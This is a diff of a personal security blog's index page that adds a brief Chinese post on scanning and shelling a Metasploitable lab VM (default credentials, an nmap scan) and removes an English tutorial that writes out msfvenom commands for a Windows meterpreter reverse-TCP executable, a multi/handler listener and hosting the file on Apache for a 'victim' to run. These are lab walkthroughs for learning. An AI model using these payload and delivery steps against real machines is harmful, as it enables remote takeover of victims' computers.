@@ -220,6 +220,70 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-Metasploitable靶机测试" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/06/21/Metasploitable靶机测试/" class="article-date">
+      <time datetime="2016-06-20T16:02:17.000Z" itemprop="datePublished">2016-06-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/06/21/Metasploitable靶机测试/">Metasploitable靶机测试</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>网上Google下载Metasploitable靶机，安装完打开默认的用户名和密码是<br>msfadmin,msfadmin</p>
+<h3 id="做一个小小的测试"><a href="#做一个小小的测试" class="headerlink" title="做一个小小的测试"></a>做一个小小的测试</h3><p>在kali 进行nmap扫描可利用信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="operator">-s</span>S <span class="number">192.168</span>.<span class="number">130.135</span></span><br></pre></td></tr></table></figure></p>
+<p>注意这个IP地址是我的靶机地址</p>
+<p>我们可以看到丰富的端口信息<br><img src="http://7xs1w6.com1.z0.glb.clouddn.com/nmapmetasploit.png" alt=""></p>
+<p>然后上我们的Metasploit<br><img src="http://7xs1w6.com1.z0.glb.clouddn.com/metasploit.png" alt=""></p>
+<p>最后进行exploit<br><img src="http://7xs1w6.com1.z0.glb.clouddn.com/shell_get.png" alt=""></p>
+<p>成功获取shell</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-Google-hack" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -839,77 +903,9 @@ if packet[ARP].op == 1:
 
 
   
-    <article id="post-Hack-Windows-10-8-8-1-7-With-Metasploit" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/04/12/Hack-Windows-10-8-8-1-7-With-Metasploit/" class="article-date">
-      <time datetime="2016-04-12T12:17:04.000Z" itemprop="datePublished">2016-04-12</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/04/12/Hack-Windows-10-8-8-1-7-With-Metasploit/">Hack Windows 10-8-8.1-7 With Metasploit</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h3 id="How-to-hack-windows-10-8-8-1-7-with-Metasploit"><a href="#How-to-hack-windows-10-8-8-1-7-with-Metasploit" class="headerlink" title="How to hack windows 10-8-8.1-7 with Metasploit"></a>How to hack windows 10-8-8.1-7 with Metasploit</h3><h3 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h3><h2 id="Generate-an-executable-file"><a href="#Generate-an-executable-file" class="headerlink" title="Generate an executable file"></a>Generate an executable file</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp</span><br><span class="line">LHOST=<span class="number">192.168</span>.<span class="number">130.132</span> LPORT=<span class="number">4444</span> <span class="operator">-f</span> exe &gt; /root/Desktop/</span><br><span class="line">WindowsPath.exe</span><br></pre></td></tr></table></figure>
-<p>The “LHOST” is our local machine!<br>The WindowsPath.exe is the executable file which we<br>will use later on target machine</p>
-<h2 id="Using-multi-handler"><a href="#Using-multi-handler" class="headerlink" title="Using multi handler"></a>Using multi handler</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.open the msfconsole</span><br><span class="line">Just run the <span class="built_in">command</span> <span class="string">"msfconsole"</span></span><br><span class="line"><span class="number">2</span>.use multi handler</span><br><span class="line">Just run the <span class="built_in">command</span> <span class="string">"use multi/handler"</span></span><br><span class="line"><span class="number">3</span>.set Payload</span><br><span class="line">Just run the <span class="built_in">command</span> <span class="string">"set PAYLOAD windows/meterpreter/reverse_tcp"</span></span><br><span class="line"><span class="number">4</span>.Set LHOST and LPORT on Kali Linux</span><br><span class="line">Just run the following <span class="built_in">command</span></span><br><span class="line"><span class="string">"set LHOST 192.168.130.132"</span></span><br><span class="line"><span class="string">"set LPORT 4444"</span></span><br></pre></td></tr></table></figure>
-<h2 id="Start-the-apache2-service-in-Debian"><a href="#Start-the-apache2-service-in-Debian" class="headerlink" title="Start the apache2 service in Debian"></a>Start the apache2 service in Debian</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. We open the apache2 service</span><br><span class="line">Just run <span class="built_in">command</span> <span class="string">"service apache2 start"</span></span><br><span class="line"><span class="number">2</span>. Open the browser and enter <span class="string">"localhost"</span> to see</span><br><span class="line"><span class="keyword">if</span> the apache server was working!</span><br></pre></td></tr></table></figure>
-<p><img src="http://7xs1w6.com1.z0.glb.clouddn.com/apache.png" alt=""></p>
-<p>Well my server works quit Well. Let’s continue</p>
-<h2 id="Put-the-executable-file-in-our-server"><a href="#Put-the-executable-file-in-our-server" class="headerlink" title="Put the executable file in our server"></a>Put the executable file in our server</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"cp /root/Desktop/WindowsPath.exe /var/www/mybase/"</span></span><br><span class="line">Notice: I change the location of DocumentRoot.</span><br><span class="line">If you don<span class="string">'t know how to change the location, pls google, ZZ</span></span><br></pre></td></tr></table></figure>
-<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Just run <span class="string">"exploit"</span></span><br><span class="line">When the victim open the WindowsPath.exe file, our</span><br><span class="line">work was done.</span><br></pre></td></tr></table></figure>
-<h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Run <span class="string">"sysinfo"</span> to see the version of Windows</span><br><span class="line">Run “shell” to open the shell of Windows</span><br></pre></td></tr></table></figure>
-<p>Here is my Test,i finish it on my virtual machines.<br><img src="http://7xs1w6.com1.z0.glb.clouddn.com/shell.jpg" alt=""></p>
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.offensive-security.com/metasploit-unleashed/binary-payloads/" target="_blank" rel="external">Binary-Payloads</a></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Metasploit/">Metasploit</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
     </nav>
   
 </div>
